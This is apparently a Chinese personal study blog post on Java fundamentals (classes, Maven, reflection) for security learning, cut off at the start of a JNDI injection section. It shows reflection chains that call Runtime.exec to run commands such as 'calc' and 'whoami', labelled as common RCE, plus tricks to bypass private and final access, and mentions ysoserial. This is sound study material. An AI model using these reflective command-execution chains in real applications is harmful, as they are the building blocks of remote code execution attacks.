      <title>java简单学习</title>
      <link href="/2023/05/01/JAVA%E5%AE%89%E5%85%A8/"/>
      <url>/2023/05/01/JAVA%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA基本了解"><a href="#JAVA基本了解" class="headerlink" title="JAVA基本了解"></a>JAVA基本了解</h1><p><a href="https://blog.csdn.net/MinggeQingchun/article/details/120578602">(71条消息) Java–Java版本和JDK版本_java版本和jdk版本区别_MinggeQingchun的博客-CSDN博客</a></p><p><img src="/../images/image-20230501122332032.png" alt="image-20230501122332032"></p><p>JDK8u311 → JAVA8</p><h3 id="java名词"><a href="#java名词" class="headerlink" title="java名词"></a>java名词</h3><p>Java是将代码编译成一种“字节码”，它类似于抽象的CPU指令，然后，针对不同平台编写虚拟机，不同平台的虚拟机负责加载字节码并执行，这样就实现了“一次编写，到处运行”的效果。</p><p><img src="/../images/image-20230425225221871.png" alt="image-20230425225221871"></p><p><img src="/../images/image-20230425225139403.png" alt="image-20230425225139403"></p><p><img src="/../images/image-20230425225121609.png" alt="image-20230425225121609"></p><p>jar包实际上就是一个zip格式的压缩文件</p><h3 id="运行java程序"><a href="#运行java程序" class="headerlink" title="运行java程序"></a>运行java程序</h3><p><img src="/../images/image-20230425225313657.png" alt="image-20230425225313657"></p><p>一个Java源码只能定义一个<code>public</code>类型的class，并且class名称和文件名要完全一致；</p><p>注意：</p><p>我们通常说的Java 8，Java 11，Java 17，是指JDK的版本，也就是JVM的版本</p><p>而每个版本的JVM，它能执行的class文件版本也不同。例如，Java 11对应的class文件版本是55，而Java 17对应的class文件版本是61。</p><p><strong>高版本的JDK可编译输出低版本兼容的class文件</strong>，但需注意，低版本的JDK可能不存在高版本JDK添加的类和方法，导致运行时报错。</p><p>运行时使用哪个JDK版本，编译时就尽量使用同一版本编译源码。</p><h3 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p><img src="/../images/image-20230425225605486.png" alt="image-20230425225605486"></p><p><img src="/../images/image-20230425225757719.png" alt="image-20230425225757719"></p><p>定义private字段和pubilc方法来操作private字段</p><blockquote><p>虽然外部代码不能直接修改<code>private</code>字段，但是，外部代码可以调用方法<code>setName()</code>和<code>setAge()</code>来间接修改<code>private</code>字段。在方法内部，我们就有机会检查参数对不对。比如，<code>setAge()</code>就会检查传入的参数，参数超出了范围，直接报错。这样，外部代码就没有任何机会把<code>age</code>设置成不合理的值。</p></blockquote><p>定义private方法</p><blockquote><p><code>private</code>方法，外部代码无法调用，但是，内部方法可以调用它。</p><p>方法可以封装一个类的对外接口，调用方不需要知道也不关心字段是否存在</p></blockquote><h4 id="Java-Bean"><a href="#Java-Bean" class="headerlink" title="Java Bean"></a>Java Bean</h4><blockquote><p>JavaBean是一种符合命名规范的<code>class</code>，它通过<code>getter</code>和<code>setter</code>来定义属性；</p></blockquote><p>例子</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.age; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123; <span class="built_in">this</span>.age = age; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p><img src="/../images/image-20230425233400613.png" alt="image-20230425233400613"></p><h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><blockquote><p>如果一个<code>class</code>定义了方法，但没有具体执行代码，这个方法就是抽象方法，抽象方法用<code>abstract</code>修饰。</p><p>因为无法执行抽象方法，因此这个类也必须申明为抽象类（abstract class）。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>使用<code>abstract</code>修饰的类就是抽象类。我们无法实例化一个抽象类：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(); <span class="comment">// 编译错误</span></span><br></pre></td></tr></table></figure><blockquote><p>无法实例化的抽象类有什么用？</p><p>因为抽象类本身被设计成只能用于被继承，因此，抽象类可以强迫子类实现其定义的抽象方法，否则编译会报错。因此，抽象方法实际上相当于定义了“规范”：即规定高层类的接口，从而保证所有子类都有相同的接口实现，这样，多态就能发挥出威力。</p></blockquote><h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><blockquote><p>如果一个抽象类没有字段，所有方法全部都是抽象方法，就可以把该抽象类改写为接口：<code>interface</code>。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">    String <span class="title function_">getName</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当一个具体的<code>class</code>去实现一个<code>interface</code>时，需要使用<code>implements</code>关键字。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name + <span class="string">&quot; run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接口的继承</p><p><img src="/../images/image-20230425233728359.png" alt="image-20230425233728359"></p><h4 id="静态字段和静态方法"><a href="#静态字段和静态方法" class="headerlink" title="静态字段和静态方法"></a>静态字段和静态方法</h4><blockquote><p>修饰符static</p><p>静态方法和静态字段属于<code>class</code>而不属于实例</p></blockquote><p><img src="/../images/image-20230425234023210.png" alt="image-20230425234023210"></p><p>使用类名来访问</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person.setNumber(<span class="number">99</span>);</span><br><span class="line">System.out.println(Person.number);</span><br></pre></td></tr></table></figure><h4 id="包"><a href="#包" class="headerlink" title="包"></a>包</h4><blockquote><p>一个包就是一个命名空间</p><p>真正的完整类名是<code>包名.类名</code></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> xxx; <span class="comment">// 申明包名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> packge_name.class_name; <span class="comment">// 导入其他包中的类</span></span><br></pre></td></tr></table></figure><h4 id="常用类"><a href="#常用类" class="headerlink" title="常用类"></a>常用类</h4><p><img src="/../images/java.lang.png" alt="img"></p><h5 id="String对象"><a href="#String对象" class="headerlink" title="String对象"></a>String对象</h5><blockquote><p>Java中的String是不可变的，因为String类的存储是通过final修饰的char[]数组来存放结果的，不可更改。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">        System.out.println(s.hashCode());</span><br><span class="line">        System.out.println(s.toUpperCase().hashCode());</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230428115645212.png" alt="image-20230428115645212"></p><h5 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h5><p>内存数据与外存数据，使用字节流或字符流</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="comment">// getInputStream()获得结果</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream();</span><br><span class="line">        <span class="comment">// 用来缓存命令执行结果数据</span></span><br><span class="line">        <span class="type">byte</span>[] cache = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">readLen</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// read方法将数据读取到cache字节数组中，如果返回-1说明到了结尾，数据读取完毕</span></span><br><span class="line">        <span class="keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">// 数据读取完毕后，write方法将cache数组中从0到readlen的数据写入输出流中</span></span><br><span class="line">            byteArrayOutputStream.write(cache, <span class="number">0</span>, readLen);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(byteArrayOutputStream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h1><p><a href="https://cloud.tencent.com/developer/article/1887019">IDEA中的debug断点调试技巧，学会真的香！ - 腾讯云开发者社区-腾讯云</a></p><p><a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">(72条消息) IntelliJ IDEA创建Servlet最新方法 Idea版本2020.2.2以及IntelliJ IDEA创建Servlet 404问题（超详细）_idea创建servlet项目_Granger_g的博客-CSDN博客</a></p><h2 id="ysoserial-调试"><a href="#ysoserial-调试" class="headerlink" title="ysoserial 调试"></a>ysoserial 调试</h2><p>下载源码，等待maven导入依赖，再配置如下即可（java版本为java8）</p><p><img src="/../images/image-20230502220543589.png" alt="image-20230502220543589"></p><h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><blockquote><p>Maven是一个Java项目管理和构建工具，它可以定义项目结构、项目依赖，并使用统一的方式进行自动化构建，是Java项目不可缺少的工具。</p></blockquote><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><h3 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h3><p><img src="/../images/image-20230426102535777.png" alt="image-20230426102535777"></p><h3 id="模块化管理"><a href="#模块化管理" class="headerlink" title="模块化管理"></a>模块化管理</h3><p>把一个项目分成多个模块</p><p><img src="/../images/image-20230426102935510.png" alt="image-20230426102935510"></p><p>Maven的中央仓库，存储各种模块，例如，我们使用commons logging、log4j这些第三方模块，就是第三方模块的开发者自己把编译好的jar包发布到Maven的中央仓库中。</p><h2 id="更换中央仓库源"><a href="#更换中央仓库源" class="headerlink" title="更换中央仓库源"></a>更换中央仓库源</h2><p>修改 maven 根目录下的 conf 文件夹中的 settings.xml 文件，在 mirrors 节点上，添加内容如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>阿里云公共仓库<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p><a href="https://www.runoob.com/maven/maven-plugins.html">https://www.runoob.com/maven/maven-plugins.html</a></p><h2 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h2><p><a href="https://www.runoob.com/maven/maven-pom.html">https://www.runoob.com/maven/maven-pom.html</a></p><p>包含了项目的基本信息，用于描述项目如何构建，声明项目依赖，等等。</p><p>引入外部依赖</p><blockquote><p>要添加依赖项，我们一般是先在 src 文件夹下添加 lib 文件夹，然后将你工程需要的 jar 文件复制到 lib 文件夹下。</p></blockquote><h3 id="注册依赖"><a href="#注册依赖" class="headerlink" title="注册依赖"></a>注册依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 在这里添加你的依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ldapjdk<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  <span class="comment">&lt;!-- 库名称，也可以自定义 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ldapjdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>    <span class="comment">&lt;!--库名称，也可以自定义--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!--版本号--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span> <span class="comment">&lt;!--作用域--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>$&#123;basedir&#125;\src\lib\ldapjdk.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span> <span class="comment">&lt;!--项目根目录下的lib文件夹下--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p><img src="/../images/image-20230426105518262.png" alt="image-20230426105518262"></p><h2 id="Maven打包程序"><a href="#Maven打包程序" class="headerlink" title="Maven打包程序"></a>Maven打包程序</h2><p><a href="https://cloud.tencent.com/developer/article/2089955">Maven打包三种方法和常用命令大全-腾讯云开发者社区-腾讯云</a></p><p><img src="/../images/image-20230826121756632.png" alt="image-20230826121756632"></p><h2 id="与Gradle的区别"><a href="#与Gradle的区别" class="headerlink" title="与Gradle的区别"></a>与Gradle的区别</h2><p><a href="https://www.runoob.com/maven/maven-plugins.html">https://www.runoob.com/maven/maven-plugins.html</a></p><h1 id="JAVA-WEB"><a href="#JAVA-WEB" class="headerlink" title="JAVA WEB"></a>JAVA WEB</h1><p>Servlet Tomcat JSP</p><p>传统XML配置</p><p>SSM&#x2F;SSHSpringBoot</p><p>SpringCloud (了解即可)</p><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><p>泛型就是编写模板代码来适应任意类型；</p><p>泛型的好处是使用时不必对类型进行强制转换，它通过编译器对类型进行检查；</p><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><blockquote><p>反射是Java的特征之一，是一种间接操作目标对象的机制，核心是<strong>JVM在运行状态的时候才动态加载类</strong>，对于任意一个类，都能够知道这个类中的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p></blockquote><p>类加载流程如下</p><p><img src="/../images/EsePjI7n9CtyqbA.png" alt="image-20230502220543579"></p><p>JVM在第一次读取到一种<code>class</code>类型时，将其加载进内存后会为其创建一个<code>Class</code>类型的实例，并在该实例中保存了该<code>class</code>的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个<code>Class</code>实例，我们就可以通过这个<code>Class</code>实例获取到该实例对应的<code>class</code>的所有信息。</p><h3 id="相关类"><a href="#相关类" class="headerlink" title="相关类"></a>相关类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.Class：类对象;</span><br><span class="line"></span><br><span class="line">java.lang.reflect.Constructor：类的构造器对象;</span><br><span class="line"></span><br><span class="line">java.lang.reflect.Field：类的属性对象;</span><br><span class="line"></span><br><span class="line">java.lang.reflect.Method：类的方法对象;</span><br><span class="line"></span><br><span class="line">java.lang.reflect.Modifier：类的修饰符对象;</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><code>Class</code>类型实际上是一个名叫<code>Class</code>的<code>class</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Class</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Class</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出Class类的构造器是私有的，所以只有JVM能够创建Class对象。</p><p>如果我们想使用就需要以下几种方法获得：</p><h4 id="获得Class类"><a href="#获得Class类" class="headerlink" title="获得Class类"></a>获得Class类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//调用Class类的静态方法forName获取某个类的Class类实例：</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;User&quot;</span>);</span><br><span class="line">注：类名默认为类完整路径，如java.lang.Runtime</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用某个类实例的getClass()方法：</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">User</span>()).getClass();    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//访问某个类实例的class属性，这个属性就存储着这个类对应的Class类的实例</span></span><br><span class="line"><span class="comment">//这个⽅法其实不属于反射</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">User</span>()).class;</span><br></pre></td></tr></table></figure><h4 id="获得构造函数"><a href="#获得构造函数" class="headerlink" title="获得构造函数"></a>获得构造函数</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] getConstructors() ：只返回<span class="keyword">public</span>构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;&gt; getConstructor(类&lt;?&gt;... parameterTypes) : 匹配和参数配型相符的<span class="keyword">public</span>构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;... parameterTypes) ： 匹配和参数配型相符的构造函数</span><br></pre></td></tr></table></figure><h4 id="实例化类"><a href="#实例化类" class="headerlink" title="实例化类"></a>实例化类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">clz.newInstance();</span><br></pre></td></tr></table></figure><blockquote><p>实际上是调用了该类的无参构造函数</p><p>所以前提条件：</p><p>该类有无参构造函数，并且是公有的</p></blockquote><h4 id="获得成员方法"><a href="#获得成员方法" class="headerlink" title="获得成员方法"></a>获得成员方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method method=Class.getMethod(String name, 类&lt;?&gt;... parameterTypes) <span class="comment">//返回该类所声明的public方法</span></span><br><span class="line"></span><br><span class="line">Method method=Class.getDeclaredMethod(String name, 类&lt;?&gt;... parameterTypes) <span class="comment">//返回该类所声明的所有方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个参数为方法名，第二个参数为这个方法的参数类型</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">Method method=Class.getMethods() <span class="comment">//获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</span></span><br><span class="line"></span><br><span class="line">Method method=Class.getDeclaredMethods() <span class="comment">// 获取该类中的所有方法</span></span><br></pre></td></tr></table></figure><h4 id="使用成员方法"><a href="#使用成员方法" class="headerlink" title="使用成员方法"></a>使用成员方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">method.invoke(类实例, [该方法的参数类型]);</span><br></pre></td></tr></table></figure><blockquote><p><strong>如果调用这个方法是普通方法，第一个参数就是类对象；</strong></p><p><strong>如果调用这个方法是静态方法，第一个参数就是类；</strong></p></blockquote><h4 id="获取成员变量"><a href="#获取成员变量" class="headerlink" title="获取成员变量"></a>获取成员变量</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field[] getFields() ：获取所有 <span class="keyword">public</span> 修饰的成员变量</span><br><span class="line"></span><br><span class="line">Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</span><br><span class="line"></span><br><span class="line">Field <span class="title function_">getField</span><span class="params">(String name)</span> 获取指定名称的 <span class="keyword">public</span> 修饰的成员变量</span><br><span class="line"></span><br><span class="line">Field <span class="title function_">getDeclaredField</span><span class="params">(String name)</span> 获取指定的成员变量</span><br></pre></td></tr></table></figure><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>常用的RCE</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>注意<code>Runtime</code>这个类的构造函数是私有的，所以我们正常只能通过公有的方法<code>Runtime.getRuntime() </code>来获取到 Runtime 对象</p></blockquote><p>通过反射实现上述代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">//首先需要获得Runtime类的Class实例</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//获得Runtime类的getRuntime方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getruntime</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用该方法获得Runtime对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getruntime.invoke(clz);</span><br><span class="line"><span class="comment">//获得Runtime类的exec方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"><span class="comment">//调用exec方法执行命令</span></span><br><span class="line">exec.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>整合成一句</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="强制访问私有，保护"><a href="#强制访问私有，保护" class="headerlink" title="强制访问私有，保护"></a>强制访问私有，保护</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>上述命令执行代码可以转为</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class c1= Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获得构造函数</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> c1.getDeclaredConstructor();</span><br><span class="line">        <span class="comment">// 获得访问私有方法和属性的权限</span></span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">        c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改final字段"><a href="#修改final字段" class="headerlink" title="修改final字段"></a>修改<code>final</code>字段</h3><p><img src="/../images/image-20230503115304804.png" alt="image-20230503115304804"></p><ul><li><p>只有final修饰，并且为间接赋值，可以修改</p></li><li><p>如果是final+static修饰，并且为间接赋值，需要先去掉final修饰符才能修改</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获得modifiers</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">nameModifyField</span> <span class="operator">=</span> nameField.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line"><span class="comment">// 修改权限</span></span><br><span class="line">nameModifyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 去除final修饰符</span></span><br><span class="line">nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"><span class="comment">// 修改Field值</span></span><br><span class="line">nameField.set(m,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;Drunkbaby Too Silly&quot;</span>));</span><br><span class="line"><span class="comment">// 重新添加上final修饰符</span></span><br><span class="line">nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);</span><br></pre></td></tr></table></figure></li></ul><h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><p><img src="/../images/image-20230505171840712.png" alt="image-20230505171840712"></p><h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><p><a href="https://xz.aliyun.com/t/9002">JAVA安全基础（一）–类加载器（ClassLoader） - 先知社区</a></p><h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><p><a href="https://tttang.com/archive/1611/#toc_api">JNDI注入分析 - 跳跳糖</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/14880727.html">Java JNDI注入（一） - zpchcbd - 博客园</a></p><h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h2><p><code>JNDI(Java Naming and Directory Interface)</code>是<code>Java</code>提供的<code>Java</code>命名和目录接口。</p><blockquote><p>Naming Service 命名服务：命名服务将名称和对象进行关联，提供通过名称找到对象的操作</p><p>Directory Service目录服务：目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。</p></blockquote><p>通过调用<code>JNDI</code>的<code>API</code>可以定位资源和其他程序对象。</p><blockquote><p>通过名称查找(<code>lookup</code>)对象 </p><p>通过对象的属性搜索(<code>search</code>)对象</p></blockquote><p><code>JNDI</code>是<code>Java 